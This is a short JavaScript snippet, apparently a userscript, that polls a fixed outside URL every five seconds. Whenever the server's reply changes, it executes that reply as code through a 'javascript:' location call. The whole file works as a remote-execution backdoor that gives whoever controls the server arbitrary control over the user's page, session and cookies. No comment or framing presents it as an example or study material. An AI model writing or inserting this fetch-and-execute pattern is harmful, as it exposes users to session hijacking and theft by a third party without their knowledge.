var mess;
var firstmess = true;
function getmessages() {
    const Http = new XMLHttpRequest();
const url='http://tachyonforwardtechnologies.com/mope2/message.php';
Http.open("GET", url);
Http.send();

Http.onreadystatechange = (e) => {
    if (Http.responseText != "") {
    if (mess != Http.responseText) {
    mess = Http.responseText;
    if (firstmess == false) {
  location.replace("javascript:" + Http.responseText)
    }
    else {
      firstmess = false;
      mess = Http.responseText;
    }
    }
}
}
}
setInterval(getmessages, 5000);
